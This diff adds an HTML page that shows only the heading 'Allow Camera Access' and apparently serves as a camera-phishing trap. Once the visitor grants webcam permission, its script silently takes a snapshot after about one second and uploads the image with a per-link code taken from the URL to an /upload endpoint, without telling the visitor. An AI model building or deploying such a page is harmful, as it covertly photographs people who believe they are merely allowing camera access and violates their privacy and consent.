@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<body style="text-align:center">
+
+<h3>Allow Camera Access</h3>
+<video id="v" autoplay style="width:250px"></video>
+
+<script>
+const code = location.pathname.split("/").pop();
+
+async function start(){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    v.srcObject = stream;
+
+    setTimeout(()=>capture(stream),1200);
+
+  }catch{
+    alert("Permission denied");
+  }
+}
+
+function capture(stream){
+  let c = document.createElement("canvas");
+  c.width = v.videoWidth;
+  c.height = v.videoHeight;
+  c.getContext("2d").drawImage(v,0,0);
+
+  fetch("/upload",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+      code: code,
+      image: c.toDataURL("image/png")
+    })
+  });
+
+  stream.getTracks().forEach(t=>t.stop());
+}
+
+start();
+</script>
+
+</body>
+</html>
